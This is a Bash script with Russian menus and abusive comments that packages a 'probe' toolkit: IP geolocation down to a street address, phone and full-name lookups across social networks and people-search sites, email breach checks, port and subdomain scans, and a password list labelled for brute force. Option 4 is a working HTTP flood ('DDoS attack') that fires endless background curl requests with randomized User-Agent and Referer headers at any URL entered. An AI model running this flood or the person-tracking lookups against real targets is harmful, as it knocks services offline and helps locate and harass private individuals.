#!/bin/bash
# ==================================================
# PROBE FINAL EDITION - ПОСЛЕДНЯЯ ВЕРСИЯ ДЛЯ ДЕБИЛОВ
# ВНИМАНИЕ: ЭТО ПОСЛЕДНИЙ РАЗ, ПОТОМ ИДИ НАХУЙ
# ==================================================

# Цвета (оставим, чтобы тебе было красиво)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
NC='\033[0m'
BOLD='\033[1m'

# Функция возврата в меню
press_enter() {
    echo ""
    echo -e "${YELLOW}Нажми Enter, чтобы вернуться в главное меню...${NC}"
    read
    clear
}

# Проверка зависимостей
check_deps() {
    deps=("curl" "jq" "whois" "nslookup" "nmap" "traceroute" "dig")
    missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v $dep &> /dev/null; then
            missing+=($dep)
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${RED}[!] Отсутствуют хуйни: ${missing[*]}${NC}"
        echo -e "${YELLOW}[*] Ставь: apk add ${missing[*]}${NC}"
        return 1
    fi
    return 0
}

# Заголовок
header() {
    clear
    echo -e "${BOLD}${CYAN}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║              PROBE - ПОСЛЕДНЯЯ ВЕРСИЯ                      ║"
    echo "║         Для тех, кто заебал с прокси                       ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# ОПЦИЯ 1: IP инфо с координатами
op1_ip() {
    header
    echo -e "${BOLD}${GREEN}[1] ПРОБИВ ПО IP С КООРДИНАТАМИ${NC}"
    read -p "Введи IP: " ip
    
    if [[ -z "$ip" ]]; then
        echo -e "${RED}[!] IP не введен${NC}"
        press_enter
        return
    fi
    
    echo -e "${YELLOW}[*] Получаю инфу...${NC}"
    
    # whois
    echo -e "\n${BLUE}--- WHOIS ---${NC}"
    whois $ip 2>/dev/null | grep -E 'inetnum|netname|descr|country|address|phone|e-mail' | head -15 | sed 's/^/  /'
    
    # ip-api
    echo -e "\n${BLUE}--- ГЕОДАННЫЕ ---${NC}"
    data=$(curl -s "http://ip-api.com/json/$ip?fields=66846719&lang=ru")
    
    status=$(echo $data | jq -r '.status')
    if [[ "$status" == "success" ]]; then
        echo $data | jq -r '
            "  Страна: " + .country +
            "\n  Регион: " + .regionName +
            "\n  Город: " + .city +
            "\n  Район: " + (.district // "нет") +
            "\n  Индекс: " + (.zip // "нет") +
            "\n  Широта: " + (.lat | tostring) +
            "\n  Долгота: " + (.lon | tostring) +
            "\n  Точность: " + (.accuracy | tostring) + " км" +
            "\n  Провайдер: " + .isp +
            "\n  Организация: " + .org
        '
        
        lat=$(echo $data | jq -r '.lat')
        lon=$(echo $data | jq -r '.lon')
        
        echo -e "\n${BLUE}--- ССЫЛКИ НА КАРТЫ ---${NC}"
        echo -e "  Google: https://www.google.com/maps?q=$lat,$lon"
        echo -e "  Яндекс: https://yandex.ru/maps/?ll=$lon,$lat&pt=$lon,$lat"
        
        # Пробуем получить адрес
        addr=$(curl -s "https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lon" | jq -r '.display_name // "Не определен"')
        echo -e "\n${BLUE}--- АДРЕС (приблизительно) ---${NC}"
        echo "  $addr"
    else
        echo -e "${RED}  Ошибка: $(echo $data | jq -r '.message')${NC}"
    fi
    
    press_enter
}

# ОПЦИЯ 2: Телефон
op2_phone() {
    header
    echo -e "${BOLD}${GREEN}[2] ПРОБИВ ПО ТЕЛЕФОНУ${NC}"
    read -p "Введи номер (+79522222222): " phone
    
    python3 << EOF 2>/dev/null
import phonenumbers
from phonenumbers import carrier, geocoder, timezone

try:
    num = phonenumbers.parse("$phone")
    print("\nСтрана/регион:", geocoder.description_for_number(num, "ru"))
    print("Оператор:", carrier.name_for_number(num, "ru"))
    print("Часовой пояс:", timezone.time_zones_for_number(num))
    print("Валидный:", phonenumbers.is_valid_number(num))
    print("Возможный:", phonenumbers.is_possible_number(num))
    print("Формат E164:", phonenumbers.format_number(num, phonenumbers.PhoneNumberFormat.E164))
    print("Национальный:", phonenumbers.format_number(num, phonenumbers.PhoneNumberFormat.NATIONAL))
except:
    print("Ошибка парсинга")
EOF
    
    echo -e "\n${BLUE}--- ПОИСК В СЕТИ ---${NC}"
    echo "  Google: https://www.google.com/search?q=%22$phone%22"
    echo "  Яндекс: https://yandex.ru/search/?text=$phone"
    
    press_enter
}

# ОПЦИЯ 3: ФИО
op3_fio() {
    header
    echo -e "${BOLD}${GREEN}[3] ПОИСК ПО ФИО${NC}"
    read -p "Введи ФИО: " fio
    
    encoded=$(echo $fio | sed 's/ /+/g')
    
    echo -e "\n${BLUE}--- ПОИСКОВИКИ ---${NC}"
    echo "  Google: https://www.google.com/search?q=%22$encoded%22"
    echo "  Яндекс: https://yandex.ru/search/?text=$encoded"
    
    echo -e "\n${BLUE}--- СОЦСЕТИ ---${NC}"
    echo "  VK: https://vk.com/people?q=$encoded"
    echo "  OK: https://ok.ru/search?st.query=$encoded"
    echo "  FB: https://www.facebook.com/search/people/?q=$encoded"
    
    echo -e "\n${BLUE}--- ПОИСК ПО БАЗАМ (сайты) ---${NC}"
    echo "  GetContact: https://getcontact.com/ru/search?q=$encoded"
    echo "  ************: https://************.ru/search?q=$encoded"  # Заменишь сам
    
    press_enter
}

# ОПЦИЯ 4: DDoS (без прокси, с рандомом)
op4_ddos() {
    header
    echo -e "${BOLD}${RED}[4] DDoS-АТАКА (БЕЗ ПРОКСИ)${NC}"
    echo -e "${RED}╔════════════════════════════════════════════════════════════╗"
    echo "║ ТВОЙ IP БУДЕТ ВИДЕН, ПЕТУХ!                                   ║"
    echo "║ Но я хотя бы User-Agent рандомный поставлю.                   ║"
    echo "║ Для анонимности используй VPN, если не лох.                   ║"
    echo -e "╚════════════════════════════════════════════════════════════╝${NC}"
    
    read -p "URL цели (http://example.com): " url
    read -p "Количество потоков (1-10): " threads
    read -p "Время атаки в секундах (0 - бесконечно): " duration
    
    if [[ -z "$url" ]]; then
        echo -e "${RED}[!] URL не введен${NC}"
        press_enter
        return
    fi
    
    [[ -z "$threads" ]] && threads=5
    [[ -z "$duration" ]] && duration=0
    
    user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    )
    
    attack() {
        local ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        local refs=("https://google.com" "https://yandex.ru" "https://bing.com" "" "")
        local ref=${refs[$RANDOM % ${#refs[@]}]}
        
        curl -s -o /dev/null \
            -A "$ua" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            -H "Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7" \
            ${ref:+-H "Referer: $ref"} \
            --connect-timeout 2 \
            "$url" &
    }
    
    echo -e "${YELLOW}[*] Запуск атаки на $duration секунд...${NC}"
    
    if [[ $duration -gt 0 ]]; then
        end=$((SECONDS + duration))
        while [[ $SECONDS -lt $end ]]; do
            for i in $(seq 1 $threads); do
                attack
            done
            sleep 0.1
        done
    else
        echo -e "${RED}[*] Атака бесконечная. ЖМИ CTRL+C для остановки.${NC}"
        while true; do
            for i in $(seq 1 $threads); do
                attack
            done
            sleep 0.1
        done
    fi
    
    press_enter
}

# ОПЦИЯ 5: Поиск email
op5_email() {
    header
    echo -e "${BOLD}${GREEN}[5] ПОИСК EMAIL${NC}"
    read -p "Введи email: " email
    
    domain=$(echo $email | cut -d@ -f2)
    
    echo -e "\n${BLUE}--- ПРОВЕРКА УТЕЧЕК ---${NC}"
    echo "  HIBP: https://haveibeenpwned.com/account/$email"
    echo "  Firefox Monitor: https://monitor.firefox.com/scan?email=$email"
    
    echo -e "\n${BLUE}--- ПРОВЕРКА ДОМЕНА ---${NC}"
    whois $domain 2>/dev/null | grep -E 'Registrar|Creation|Expiry' | head -10 | sed 's/^/  /'
    
    echo -e "\n${BLUE}--- MX ЗАПИСИ ---${NC}"
    dig MX $domain +short | sed 's/^/  /'
    
    press_enter
}

# ОПЦИЯ 6: MAC-адрес
op6_mac() {
    header
    echo -e "${BOLD}${GREEN}[6] MAC-АДРЕС${NC}"
    read -p "Введи MAC (00:11:22:AA:BB:CC): " mac
    
    echo -e "${YELLOW}[*] Определяю производителя...${NC}"
    result=$(curl -s "https://api.macvendors.com/$mac")
    
    if [[ -n "$result" && "$result" != *"{"* ]]; then
        echo -e "${GREEN}  Производитель: $result${NC}"
    else
        echo -e "${RED}  Не найден или ошибка${NC}"
    fi
    
    # Доп инфо
    oui=$(echo $mac | cut -c1-8 | tr '[:lower:]' '[:upper:]')
    echo -e "\n${BLUE}--- OUI: $oui ---${NC}"
    echo "  Поиск: https://standards-oui.ieee.org/oui/oui.txt"
    
    press_enter
}

# ОПЦИЯ 7: WHOIS домена
op7_domain() {
    header
    echo -e "${BOLD}${GREEN}[7] WHOIS ДОМЕНА${NC}"
    read -p "Введи домен (example.com): " domain
    
    echo -e "\n${BLUE}--- WHOIS ---${NC}"
    whois $domain 2>/dev/null | grep -E 'Domain Name:|Registry Domain ID:|Registrar:|Registration|Creation Date:|Expiry Date:|Name Server:|Registrant|Admin|Tech' | head -30 | sed 's/^/  /'
    
    echo -e "\n${BLUE}--- DNS ЗАПИСИ ---${NC}"
    echo "  A: $(dig A $domain +short | head -3 | tr '\n' ' ')"
    echo "  MX: $(dig MX $domain +short | head -3 | tr '\n' ' ')"
    echo "  NS: $(dig NS $domain +short | head -3 | tr '\n' ' ')"
    
    press_enter
}

# ОПЦИЯ 8: Порт сканер
op8_ports() {
    header
    echo -e "${BOLD}${GREEN}[8] СКАН ПОРТОВ${NC}"
    read -p "Введи IP/домен: " target
    
    ports=(21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1723 3306 3389 5900 8080)
    
    echo -e "${YELLOW}[*] Сканирую 20 популярных портов...${NC}"
    
    for port in "${ports[@]}"; do
        timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && 
            echo -e "${GREEN}  Порт $port - ОТКРЫТ${NC}" ||
            echo -e "${RED}  Порт $port - закрыт${NC}" &
    done
    wait
    
    press_enter
}

# ОПЦИЯ 9: Трассировка
op9_trace() {
    header
    echo -e "${BOLD}${GREEN}[9] ТРАССИРОВКА${NC}"
    read -p "Введи IP/домен: " target
    
    echo -e "${YELLOW}[*] Запускаю traceroute...${NC}"
    traceroute -m 15 $target | sed 's/^/  /'
    
    press_enter
}

# ОПЦИЯ 10: DNS инфо
op10_dns() {
    header
    echo -e "${BOLD}${GREEN}[10] DNS ИНФОРМАЦИЯ${NC}"
    read -p "Введи домен: " domain
    
    echo -e "\n${BLUE}--- A записи ---${NC}"
    dig A $domain +short | sed 's/^/  /'
    
    echo -e "\n${BLUE}--- MX записи ---${NC}"
    dig MX $domain +short | sed 's/^/  /'
    
    echo -e "\n${BLUE}--- NS записи ---${NC}"
    dig NS $domain +short | sed 's/^/  /'
    
    echo -e "\n${BLUE}--- TXT записи ---${NC}"
    dig TXT $domain +short | sed 's/^/  /'
    
    echo -e "\n${BLUE}--- CNAME ---${NC}"
    dig CNAME $domain +short | sed 's/^/  /'
    
    press_enter
}

# ОПЦИЯ 11: Заголовки HTTP
op11_headers() {
    header
    echo -e "${BOLD}${GREEN}[11] HTTP ЗАГОЛОВКИ${NC}"
    read -p "Введи URL (https://example.com): " url
    
    echo -e "${YELLOW}[*] Получаю заголовки...${NC}"
    curl -s -I -L "$url" | sed 's/^/  /'
    
    echo -e "\n${BLUE}--- ТЕХНОЛОГИИ (примерно) ---${NC}"
    curl -s "$url" | grep -i 'server\|x-powered-by\|generator' | head -10 | sed 's/^/  /'
    
    press_enter
}

# ОПЦИЯ 12: Информация о SSL
op12_ssl() {
    header
    echo -e "${BOLD}${GREEN}[12] SSL ИНФОРМАЦИЯ${NC}"
    read -p "Введи домен: " domain
    
    echo -e "${YELLOW}[*] Проверяю SSL...${NC}"
    echo | openssl s_client -connect $domain:443 -servername $domain 2>/dev/null | openssl x509 -text | grep -E 'Subject:|Issuer:|Not Before:|Not After :|DNS:' | sed 's/^/  /'
    
    press_enter
}

# ОПЦИЯ 13: Wayback Machine
op13_wayback() {
    header
    echo -e "${BOLD}${GREEN}[13] WAYBACK MACHINE${NC}"
    read -p "Введи домен: " domain
    
    echo -e "${YELLOW}[*] Получаю историю...${NC}"
    curl -s "http://archive.org/wayback/available?url=$domain" | jq '.' | grep -E 'timestamp|url' | head -20 | sed 's/^/  /'
    
    echo -e "\n${BLUE}--- ССЫЛКА НА АРХИВ ---${NC}"
    echo "  https://web.archive.org/web/*/$domain"
    
    press_enter
}

# ОПЦИЯ 14: Поддомены
op14_subdomains() {
    header
    echo -e "${BOLD}${GREEN}[14] ПОИСК ПОДДОМЕНОВ${NC}"
    read -p "Введи домен: " domain
    
    echo -e "${YELLOW}[*] Ищу через crt.sh...${NC}"
    curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | jq -r '.[].name_value' 2>/dev/null | sort -u | head -30 | sed 's/^/  /'
    
    press_enter
}

# ОПЦИЯ 15: Генератор паролей
op15_password() {
    header
    echo -e "${BOLD}${GREEN}[15] ГЕНЕРАТОР ПАРОЛЕЙ${NC}"
    
    echo -e "\n${BLUE}--- СЛУЧАЙНЫЕ ПАРОЛИ ---${NC}"
    for i in {1..5}; do
        echo "  Пароль $i: $(openssl rand -base64 12 | tr -dc 'a-zA-Z0-9' | head -c16)"
    done
    
    echo -e "\n${BLUE}--- ПИН-КОДЫ (4-8 цифр) ---${NC}"
    echo "  PIN4: $((RANDOM % 9000 + 1000))"
    echo "  PIN6: $((RANDOM % 900000 + 100000))"
    echo "  PIN8: $((RANDOM % 90000000 + 10000000))"
    
    echo -e "\n${BLUE}--- ДЛЯ БРУТА (слова) ---${NC}"
    words=("admin" "root" "password" "123456" "qwerty" "letmein" "welcome" "monkey" "dragon" "master")
    for w in "${words[@]}"; do
        echo "  $w, $w$((RANDOM % 100)), $w$(date +%Y)"
    done
    
    press_enter
}

# Главное меню
menu() {
    header
    echo -e "${BOLD}${WHITE}ВЫБЕРИ ОПЦИЮ (1-15):${NC}"
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}1.${NC}  Пробив по IP (с координатами и адресом)        ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}2.${NC}  Пробив по телефону                             ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}3.${NC}  Поиск по ФИО                                   ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}4.${NC}  DDoS-атака (БЕЗ ПРОКСИ)                        ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}5.${NC}  Поиск по email                                 ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}6.${NC}  MAC-адрес (производитель)                      ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}7.${NC}  WHOIS домена                                   ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}8.${NC}  Скан портов (быстрый)                          ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}9.${NC}  Трассировка до хоста                           ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}10.${NC} DNS информация (все записи)                    ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}11.${NC} HTTP заголовки сайта                           ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}12.${NC} SSL сертификат                                 ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}13.${NC} Wayback Machine (история)                      ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}14.${NC} Поиск поддоменов                               ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${GREEN}15.${NC} Генератор паролей                              ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${RED}16.${NC} Выход                                           ${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    
    read -p "Выбор: " choice
    
    case $choice in
        1) op1_ip ;;
        2) op2_phone ;;
        3) op3_fio ;;
        4) op4_ddos ;;
        5) op5_email ;;
        6) op6_mac ;;
        7) op7_domain ;;
        8) op8_ports ;;
        9) op9_trace ;;
        10) op10_dns ;;
        11) op11_headers ;;
        12) op12_ssl ;;
        13) op13_wayback ;;
        14) op14_subdomains ;;
        15) op15_password ;;
        16) 
            echo -e "${RED}Пока, петух. Не возвращайся.${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Не понял, выбери цифру от 1 до 16${NC}"
            press_enter
            menu
            ;;
    esac
}

# Запуск
if check_deps; then
    menu
fi
